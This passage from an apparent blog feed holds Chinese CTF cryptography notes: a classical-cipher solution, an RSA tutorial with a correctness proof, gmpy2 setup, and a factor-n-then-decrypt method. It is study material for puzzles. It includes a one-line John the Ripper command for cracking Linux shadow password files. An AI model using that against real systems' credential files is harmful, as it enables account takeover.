&lt;SLOQXVETAMKGHIWPNYCJBFZDRU &lt;</span><br><span class="line">4：  &lt;XQYIZMJWAORPLNDVHGFCUKTEBS &lt;</span><br><span class="line">9：  &lt;WATDSRFHENYVUBMCOIKZGJXPLQ &lt;</span><br><span class="line">7：  &lt;CEONJQGWTHSPYBXIZULVKMRAFD &lt;</span><br><span class="line">8：  &lt;RJLXKISEFAPMYGHBQNOZUTWDCV &lt;</span><br><span class="line">14：&lt;QWXPHKZGJTDSENYVUBMLAOIRFC &lt;</span><br><span class="line">10：&lt;GOIKFHENYVUWABMCXPLTDSRJQZ &lt;</span><br><span class="line">13：&lt;LTDENQWAOXPYVUIKZGJBMCSRFH &lt;</span><br><span class="line">11：&lt;ENYSRUBMCQWVJXPLTDAOIKFZGH &lt;</span><br><span class="line">12：&lt;SWAYXPLVUBOIKZGJRFHENMCQTD &lt;</span><br></pre></td></tr></table></figure><p>flag在倒数第六列。</p><p>flag{XSXSBUGKUADMIN}，可能要转化为小写。</p><hr><h1 id="04-文件加密"><a class="markdownIt-Anchor" href="#04-文件加密"></a> 04 文件加密</h1><h2 id="0x01-zip压缩包破解"><a class="markdownIt-Anchor" href="#0x01-zip压缩包破解"></a> 0x01 zip压缩包破解</h2><p><a href>我跳</a></p><h2 id="0x02-linux-shadow-文件破解密码"><a class="markdownIt-Anchor" href="#0x02-linux-shadow-文件破解密码"></a> 0x02 Linux shadow 文件破解密码</h2><p>john爆破：<code>john filename</code></p><h1 id="05-其他加密"><a class="markdownIt-Anchor" href="#05-其他加密"></a> 05 其他加密</h1><h2 id="01-键盘布局加密"><a class="markdownIt-Anchor" href="#01-键盘布局加密"></a> 01 键盘布局加密</h2><p>密文：<code>r5yG lp9I BjM tFhBT6uh y7iJ QsZ bhM</code></p><p>明文：<code>TONGYUAN</code></p><h1 id="0x-参考"><a class="markdownIt-Anchor" href="#0x-参考"></a> 0x 参考</h1><ul><li>[CTF中那些脑洞大开的编码和加密](<a href="http://blog.neargle.com/SecNewsBak/drops/CTF%E4%B8%AD%E9%82%A3%E4%BA%9B%E8%84%91%E6%B4%9E%E5%A4%A7%E5%BC%80%E7%9A%84%E7%BC%96%E7%A0%81%E5%92%8C%E5%8A%A0%E5%AF%86" target="_blank" rel="noopener">http://blog.neargle.com/SecNewsBak/drops/CTF中那些脑洞大开的编码和加密</a> .html)</li><li>具体请看：<a href="https://ctf-wiki.github.io/ctf-wiki/crypto/classical/introduction-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/crypto/classical/introduction-zh/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RSA题型整理</title>
      <link href="/2020/07/07/RSA%E9%A2%98%E5%9E%8B%E6%95%B4%E7%90%86/"/>
      <url>/2020/07/07/RSA%E9%A2%98%E5%9E%8B%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="0x00-前期准备"><a class="markdownIt-Anchor" href="#0x00-前期准备"></a> 0x00 前期准备</h1><h2 id="01-基础知识"><a class="markdownIt-Anchor" href="#01-基础知识"></a> 01 基础知识</h2><p><strong>RSA加密算法</strong>是一种<a href="https://zh.wikipedia.org/wiki/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E6%BC%94%E7%AE%97%E6%B3%95" target="_blank" rel="noopener">非对称加密算法</a>，在<a href="https://zh.wikipedia.org/wiki/%E5%85%AC%E5%BC%80%E5%AF%86%E9%92%A5%E5%8A%A0%E5%AF%86" target="_blank" rel="noopener">公开密钥加密</a>和<a href="https://zh.wikipedia.org/wiki/%E7%94%B5%E5%AD%90%E5%95%86%E4%B8%9A" target="_blank" rel="noopener">电子商业</a>中被广泛使用。RSA是由<a href="https://zh.wikipedia.org/wiki/%E7%BD%97%E7%BA%B3%E5%BE%B7%C2%B7%E6%9D%8E%E7%BB%B4%E6%96%AF%E7%89%B9" target="_blank" rel="noopener">罗纳德·李维斯特</a>（Ron Rivest）、<a href="https://zh.wikipedia.org/wiki/%E9%98%BF%E8%BF%AA%C2%B7%E8%90%A8%E8%8E%AB%E5%B0%94" target="_blank" rel="noopener">阿迪·萨莫尔</a>（Adi Shamir）和<a href="https://zh.wikipedia.org/wiki/%E4%BC%A6%E7%BA%B3%E5%BE%B7%C2%B7%E9%98%BF%E5%BE%B7%E6%9B%BC" target="_blank" rel="noopener">伦纳德·阿德曼</a>（Leonard Adleman）在1977年一起提出的。当时他们三人都在<a href="https://zh.wikipedia.org/wiki/%E9%BA%BB%E7%9C%81%E7%90%86%E5%B7%A5%E5%AD%A6%E9%99%A2" target="_blank" rel="noopener">麻省理工学院</a>工作。RSA 就是他们三人姓氏开头字母拼在一起组成的。</p><h3 id="11-安全保证"><a class="markdownIt-Anchor" href="#11-安全保证"></a> 1.1 安全保证</h3><p>安全性依赖于大整数分解的难题：寻找两个不同的大素数是容易的，但将两个大素数的乘积分解成原来的两个素数是极其困难的。</p><h3 id="12-具体内容"><a class="markdownIt-Anchor" href="#12-具体内容"></a> 1.2 具体内容</h3><p>假设Bob想给Alice送一个消息m：</p><ol><li>选择两个大素数 p 和 q ，计算<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>n</mi><mo>=</mo><mi>p</mi><mi>q</mi></mrow><annotation encoding="application/x-tex">n=p q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:0.43056em;"></span><span class="strut bottom" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="base textstyle uncramped"><span class="mord mathit">n</span><span class="mrel">=</span><span class="mord mathit">p</span><span class="mord mathit" style="margin-right:0.03588em;">q</span></span></span></span>；</li><li>随机选取整数e和 d ，满足e d \equiv 1(\bmod \varphi(n))  ，其中<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>φ</mi><mo>(</mo><mi>n</mi><mo>)</mo></mrow><annotation encoding="application/x-tex">\varphi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:0.75em;"></span><span class="strut bottom" style="height:1em;vertical-align:-0.25em;"></span><span class="base textstyle uncramped"><span class="mord mathit">φ</span><span class="mopen">(</span><span class="mord mathit">n</span><span class="mclose">)</span></span></span></span> 为 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:0.43056em;"></span><span class="strut bottom" style="height:0.43056em;vertical-align:0em;"></span><span class="base textstyle uncramped"><span class="mord mathit">n</span></span></span></span>的欧拉函数；（<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>r</mi><mo>=</mo><mi>φ</mi><mo>(</mo><mi>n</mi><mo>)</mo><mo>=</mo><mi>φ</mi><mo>(</mo><mi>p</mi><mo>)</mo><mi>φ</mi><mo>(</mo><mi>q</mi><mo>)</mo><mo>=</mo><mo>(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo>)</mo><mo>(</mo><mi>q</mi><mo>−</mo><mn>1</mn><mo>)</mo></mrow><annotation encoding="application/x-tex">r = \varphi(n)=\varphi(p) \varphi(q)=(p-1)(q-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:0.75em;"></span><span class="strut bottom" style="height:1em;vertical-align:-0.25em;"></span><span class="base textstyle uncramped"><span class="mord mathit" style="margin-right:0.02778em;">r</span><span class="mrel">=</span><span class="mord mathit">φ</span><span class="mopen">(</span><span class="mord mathit">n</span><span class="mclose">)</span><span class="mrel">=</span><span class="mord mathit">φ</span><span class="mopen">(</span><span class="mord mathit">p</span><span class="mclose">)</span><span class="mord mathit">φ</span><span class="mopen">(</span><span class="mord mathit" style="margin-right:0.03588em;">q</span><span class="mclose">)</span><span class="mrel">=</span><span class="mopen">(</span><span class="mord mathit">p</span><span class="mbin">−</span><span class="mord mathrm">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathit" style="margin-right:0.03588em;">q</span><span class="mbin">−</span><span class="mord mathrm">1</span><span class="mclose">)</span></span></span></span>，选择一个小于 r 的整数 e，使 r 与 e 互质，并求得 e 关于 r 的<a href="https://zh.wikipedia.org/wiki/%E6%A8%A1%E5%8F%8D%E5%85%83%E7%B4%A0" target="_blank" rel="noopener">模逆元</a>，命名为 d 求 $ e d \equiv 1(\bmod r)$。模逆元存在，当且仅当 e 与 r 互质。）</li><li>发布e和 n 为公钥， d 为私钥；</li><li>设明文为m，加密函数为c \equiv E(m) \equiv m^{e}(\bmod n)，其中<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn><mo>&lt;</mo><mi>m</mi><mo separator="true">,</mo><mi>c</mi><mo>&lt;</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">1&lt;m, c&lt;n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:0.64444em;"></span><span class="strut bottom" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="base textstyle uncramped"><span class="mord mathrm">1</span><span class="mrel">&lt;</span><span class="mord mathit">m</span><span class="mpunct">,</span><span class="mord mathit">c</span><span class="mrel">&lt;</span><span class="mord mathit">n</span></span></span></span>；</li><li>解密函数为 m \equiv D(c) \equiv c^{d}(\bmod n)。</li></ol><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>(</mo><mi>n</mi><mo separator="true">,</mo><mi>e</mi><mo>)</mo></mrow><annotation encoding="application/x-tex">(n, e)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:0.75em;"></span><span class="strut bottom" style="height:1em;vertical-align:-0.25em;"></span><span class="base textstyle uncramped"><span class="mopen">(</span><span class="mord mathit">n</span><span class="mpunct">,</span><span class="mord mathit">e</span><span class="mclose">)</span></span></span></span> 是公钥, <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>(</mo><mi>n</mi><mo separator="true">,</mo><mi>d</mi><mo>)</mo></mrow><annotation encoding="application/x-tex">(n, d)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:0.75em;"></span><span class="strut bottom" style="height:1em;vertical-align:-0.25em;"></span><span class="base textstyle uncramped"><span class="mopen">(</span><span class="mord mathit">n</span><span class="mpunct">,</span><span class="mord mathit">d</span><span class="mclose">)</span></span></span></span> 是私钥。Alice将她的公钥<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>(</mo><mi>n</mi><mo separator="true">,</mo><mi>e</mi><mo>)</mo></mrow><annotation encoding="application/x-tex">(n, e)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:0.75em;"></span><span class="strut bottom" style="height:1em;vertical-align:-0.25em;"></span><span class="base textstyle uncramped"><span class="mopen">(</span><span class="mord mathit">n</span><span class="mpunct">,</span><span class="mord mathit">e</span><span class="mclose">)</span></span></span></span> 传给Bob，而将她的私钥 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>(</mo><mi>n</mi><mo separator="true">,</mo><mi>d</mi><mo>)</mo></mrow><annotation encoding="application/x-tex">(n, d)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:0.75em;"></span><span class="strut bottom" style="height:1em;vertical-align:-0.25em;"></span><span class="base textstyle uncramped"><span class="mopen">(</span><span class="mord mathit">n</span><span class="mpunct">,</span><span class="mord mathit">d</span><span class="mclose">)</span></span></span></span> 藏起来。</p><h3 id="13-证明"><a class="markdownIt-Anchor" href="#13-证明"></a> 1.3 证明</h3><p>下面使用欧拉定理证明解密函数的正确性，即已知1-4，证明 5 成立。</p><p><strong>证明</strong>：由于 c \equiv m^{e}(\bmod n), 所以 c^{d} \equiv m^{e d}(\bmod n), 即证 m^{e d} \equiv m(\bmod n)</p><ol><li>当 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>(</mo><mi>m</mi><mo separator="true">,</mo><mi>n</mi><mo>)</mo><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">(m, n)=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:0.75em;"></span><span class="strut bottom" style="height:1em;vertical-align:-0.25em;"></span><span class="base textstyle uncramped"><span class="mopen">(</span><span class="mord mathit">m</span><span class="mpunct">,</span><span class="mord mathit">n</span><span class="mclose">)</span><span class="mrel">=</span><span class="mord mathrm">1</span></span></span></span> 时，由欧拉定理知 , m^{\varphi(n)} \equiv 1(\bmod n), 而由条件2知 e d \equiv 1(\bmod \varphi(n)), 即存<br>在整数 k ， 使得 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>e</mi><mi>d</mi><mo>=</mo><mi>k</mi><mi>φ</mi><mo>(</mo><mi>n</mi><mo>)</mo><mo>+</mo><mn>1</mn><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">e d=k \varphi(n)+1,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:0.75em;"></span><span class="strut bottom" style="height:1em;vertical-align:-0.25em;"></span><span class="base textstyle uncramped"><span class="mord mathit">e</span><span class="mord mathit">d</span><span class="mrel">=</span><span class="mord mathit" style="margin-right:0.03148em;">k</span><span class="mord mathit">φ</span><span class="mopen">(</span><span class="mord mathit">n</span><span class="mclose">)</span><span class="mbin">+</span><span class="mord mathrm">1</span><span class="mpunct">,</span></span></span></span> 因此 , \quad m^{e d} \equiv m^{k \varphi(n)+1} \equiv m(\bmod n)；</li><li>当 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>(</mo><mi>m</mi><mo separator="true">,</mo><mi>n</mi><mo>)</mo><mo>≠</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">(m, n) \neq 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:0.75em;"></span><span class="strut bottom" style="height:1em;vertical-align:-0.25em;"></span><span class="base textstyle uncramped"><span class="mopen">(</span><span class="mord mathit">m</span><span class="mpunct">,</span><span class="mord mathit">n</span><span class="mclose">)</span><span class="mrel">≠</span><span class="mord mathrm">1</span></span></span></span> 时，由于 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>n</mi><mo>=</mo><mi>p</mi><mi>q</mi><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">n=p q,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:0.43056em;"></span><span class="strut bottom" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="base textstyle uncramped"><span class="mord mathit">n</span><span class="mrel">=</span><span class="mord mathit">p</span><span class="mord mathit" style="margin-right:0.03588em;">q</span><span class="mpunct">,</span></span></span></span> 因此 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>(</mo><mi>m</mi><mo separator="true">,</mo><mi>n</mi><mo>)</mo><mo>=</mo><mi>p</mi></mrow><annotation encoding="application/x-tex">(m, n)=p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:0.75em;"></span><span class="strut bottom" style="height:1em;vertical-align:-0.25em;"></span><span class="base textstyle uncramped"><span class="mopen">(</span><span class="mord mathit">m</span><span class="mpunct">,</span><span class="mord mathit">n</span><span class="mclose">)</span><span class="mrel">=</span><span class="mord mathit">p</span></span></span></span> 或 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>(</mo><mi>m</mi><mo separator="true">,</mo><mi>n</mi><mo>)</mo><mo>=</mo><mi>q</mi><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">(m, n)=q,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:0.75em;"></span><span class="strut bottom" style="height:1em;vertical-align:-0.25em;"></span><span class="base textstyle uncramped"><span class="mopen">(</span><span class="mord mathit">m</span><span class="mpunct">,</span><span class="mord mathit">n</span><span class="mclose">)</span><span class="mrel">=</span><span class="mord mathit" style="margin-right:0.03588em;">q</span><span class="mpunct">,</span></span></span></span> 即 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>p</mi><mi mathvariant="normal">∣</mi><mi>m</mi></mrow><annotation encoding="application/x-tex">p|m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:0.75em;"></span><span class="strut bottom" style="height:1em;vertical-align:-0.25em;"></span><span class="base textstyle uncramped"><span class="mord mathit">p</span><span class="mord mathrm">∣</span><span class="mord mathit">m</span></span></span></span> 或 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>q</mi><mi mathvariant="normal">∣</mi><mi>m</mi></mrow><annotation encoding="application/x-tex">q | m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:0.75em;"></span><span class="strut bottom" style="height:1em;vertical-align:-0.25em;"></span><span class="base textstyle uncramped"><span class="mord mathit" style="margin-right:0.03588em;">q</span><span class="mord mathrm">∣</span><span class="mord mathit">m</span></span></span></span> ，<br>若 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>p</mi><mi mathvariant="normal">∣</mi><mi>m</mi><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">p| m,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:0.75em;"></span><span class="strut bottom" style="height:1em;vertical-align:-0.25em;"></span><span class="base textstyle uncramped"><span class="mord mathit">p</span><span class="mord mathrm">∣</span><span class="mord mathit">m</span><span class="mpunct">,</span></span></span></span> 则显然 m^{e d} \equiv m^{k \varphi(n)+1} \equiv m \equiv 0(\bmod p)；<br>若 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>p</mi><mo>∤</mo><mi>m</mi><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">p\nmid m,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:0.74111em;"></span><span class="strut bottom" style="height:0.99253em;vertical-align:-0.25142em;"></span><span class="base textstyle uncramped"><span class="mord mathit">p</span><span class="mrel amsrm">∤</span><span class="mord mathit">m</span><span class="mpunct">,</span></span></span></span> 则由欧拉定理知 m^{p-1} \equiv 1(\bmod p), 于是m^{k \varphi(n)+1} \equiv m^{k(p-1)(q-1)+1} \equiv m(\bmod p)；<br>因此，对任意<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:0.43056em;"></span><span class="strut bottom" style="height:0.43056em;vertical-align:0em;"></span><span class="base textstyle uncramped"><span class="mord mathit">m</span></span></span></span>，m^{e d} \equiv m^{k \varphi(n)+1} \equiv m(\bmod p) 成立，同理可证，对任意 m, \quad m^{e d} \equiv m^{k \varphi(n)+1} \equiv m(\bmod q) 成立，因此 m^{e d} \equiv m(\bmod n) 成立。(同余性质10-最小公倍数)</li></ol><h3 id="14-安全性"><a class="markdownIt-Anchor" href="#14-安全性"></a> 1.4 安全性</h3><p>假设偷听者Eve获得了Alice的公钥 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:0.43056em;"></span><span class="strut bottom" style="height:0.43056em;vertical-align:0em;"></span><span class="base textstyle uncramped"><span class="mord mathit">n</span></span></span></span> 和 e 以及Bob的加密消息 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">c,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:0.43056em;"></span><span class="strut bottom" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="base textstyle uncramped"><span class="mord mathit">c</span><span class="mpunct">,</span></span></span></span> 但她无法直接获得Alice的私钥 d 。 要获得 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>d</mi><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">d,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:0.69444em;"></span><span class="strut bottom" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="base textstyle uncramped"><span class="mord mathit">d</span><span class="mpunct">,</span></span></span></span> 最简单的方法是将 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:0.43056em;"></span><span class="strut bottom" style="height:0.43056em;vertical-align:0em;"></span><span class="base textstyle uncramped"><span class="mord mathit">n</span></span></span></span> 分解为 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:0.43056em;"></span><span class="strut bottom" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="base textstyle uncramped"><span class="mord mathit">p</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>q</mi><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">q,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:0.43056em;"></span><span class="strut bottom" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="base textstyle uncramped"><span class="mord mathit" style="margin-right:0.03588em;">q</span><span class="mpunct">,</span></span></span></span> 这样她可以得到同余方程d e=1(\bmod (p-1)(q-1)) 并解出 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>d</mi><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">d,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:0.69444em;"></span><span class="strut bottom" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="base textstyle uncramped"><span class="mord mathit">d</span><span class="mpunct">,</span></span></span></span> 然后代入解密公式m\equiv c^{d} (\bmod n)导出<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:0.43056em;"></span><span class="strut bottom" style="height:0.43056em;vertical-align:0em;"></span><span class="base textstyle uncramped"><span class="mord mathit">m</span></span></span></span>(破密) 。<br>但至今为止还没有人找到一个多项式时间的算法来分解一个大的整数的因子，同时也还没有人能够证明这种算法不存在 (见因数分解)<br>至今为止也没有人能够证明对<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:0.43056em;"></span><span class="strut bottom" style="height:0.43056em;vertical-align:0em;"></span><span class="base textstyle uncramped"><span class="mord mathit">n</span></span></span></span>进行因数分解是唯一的从<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi></mrow><annotation encoding="application/x-tex">c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:0.43056em;"></span><span class="strut bottom" style="height:0.43056em;vertical-align:0em;"></span><span class="base textstyle uncramped"><span class="mord mathit">c</span></span></span></span>导出<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:0.43056em;"></span><span class="strut bottom" style="height:0.43056em;vertical-align:0em;"></span><span class="base textstyle uncramped"><span class="mord mathit">m</span></span></span></span>的方法，直到今天也还没有找到比它更简单的方法。（至少没有公开的方法）<br>因此今天一般认为只要<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:0.43056em;"></span><span class="strut bottom" style="height:0.43056em;vertical-align:0em;"></span><span class="base textstyle uncramped"><span class="mord mathit">n</span></span></span></span>足够大，那么黑客就没有办法了。<br>假如<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:0.43056em;"></span><span class="strut bottom" style="height:0.43056em;vertical-align:0em;"></span><span class="base textstyle uncramped"><span class="mord mathit">n</span></span></span></span>的长度小于或等于256位，那么用一台个人电脑在几个小时内就可以分解它的因子了。1999年，数百台电脑合作分解了一个512位长的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:0.43056em;"></span><span class="strut bottom" style="height:0.43056em;vertical-align:0em;"></span><span class="base textstyle uncramped"><span class="mord mathit">n</span></span></span></span>。一个由Shamir 和Tromer在2003年从理论上构建的硬件TWIRL，使人们开始质疑1024位长的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:0.43056em;"></span><span class="strut bottom" style="height:0.43056em;vertical-align:0em;"></span><span class="base textstyle uncramped"><span class="mord mathit">n</span></span></span></span>的安全性，目前推荐<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="strut" style="height:0.43056em;"></span><span class="strut bottom" style="height:0.43056em;vertical-align:0em;"></span><span class="base textstyle uncramped"><span class="mord mathit">n</span></span></span></span>的长度至少为2048位。<br>1994年<a href="https://zh.wikipedia.org/wiki/%E5%BD%BC%E5%BE%97%C2%B7%E7%A7%80%E7%88%BE" target="_blank" rel="noopener">彼得·秀尔</a>（Peter Shor）证明一台<a href="https://zh.wikipedia.org/wiki/%E9%87%8F%E5%AD%90%E8%AE%A1%E7%AE%97%E6%9C%BA" target="_blank" rel="noopener">量子计算机</a>可以在多项式时间内进行因数分解。假如量子计算机有朝一日可以成为一种可行的技术的话，那么秀尔的算法可以淘汰RSA和相关的派生算法。（即依赖于分解大整数困难性的加密算法）<br>假如有人能够找到一种有效的分解大整数的算法的话，或者假如量子计算机可行的话，那么在解密和制造更长的钥匙之间就会展开一场竞争。但从原理上来说RSA在这种情况下是不可靠的。</p><h3 id="15-参考"><a class="markdownIt-Anchor" href="#15-参考"></a> 1.5 参考</h3><ul><li>《信息安全数学基础》(主编：常相茂 周玉倩)</li><li><a href="https://zh.wikipedia.org/wiki/RSA%E5%8A%A0%E5%AF%86%E6%BC%94%E7%AE%97%E6%B3%95#%E5%AE%89%E5%85%A8" target="_blank" rel="noopener">维基百科</a></li></ul><h2 id="02-ubuntu-安装gmpy2模块"><a class="markdownIt-Anchor" href="#02-ubuntu-安装gmpy2模块"></a> 02 Ubuntu 安装gmpy2模块</h2><p>PARI/GP是一个比较强大的数论库，“针对数论中的快速计算（大数分解，代数数论，椭圆曲线…）而设计”。</p><p><strong>需要的依赖库 gmp mpfr mpc</strong></p><h3 id="gmp-库安装"><a class="markdownIt-Anchor" href="#gmp-库安装"></a> gmp 库安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libgmp-dev</span><br></pre></td></tr></table></figure><h3 id="mpfr-库安装"><a class="markdownIt-Anchor" href="#mpfr-库安装"></a> mpfr 库安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libmpfr-dev</span><br></pre></td></tr></table></figure><h3 id="mpc-库安装"><a class="markdownIt-Anchor" href="#mpc-库安装"></a> mpc 库安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libmpc-dev</span><br></pre></td></tr></table></figure><h3 id="gmpy2-安装"><a class="markdownIt-Anchor" href="#gmpy2-安装"></a> gmpy2 安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python3</span></span><br><span class="line">sudo pip3 install gmpy2</span><br><span class="line"><span class="comment">#python2</span></span><br><span class="line">sudo pip install gmpy2</span><br></pre></td></tr></table></figure><hr><h1 id="0x01-已知n-e-c求m"><a class="markdownIt-Anchor" href="#0x01-已知n-e-c求m"></a> 0x01 已知n、e、c，求m</h1><h2 id="01-思路"><a class="markdownIt-Anchor" href="#01-思路"></a> 01 思路</h2><ol><li>利用 <a href="http://factordb.com/" target="_blank" rel="noopener">http://factordb.com/</a> 分解n获得p和q；</li><li>计算d；</li><li>解密得明文m。</li></ol><h2 id="02-代码"><a class="markdownIt-Anchor" href="#02-代码"></a> 02 代码</h2><ul><li><strong>代码1</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes,bytes_to_long,getPrime,isPrime</span><br><span class="line"><span class="keyword">import</span> primefac</span><br><span class="line"></span><br><span class="line"><span 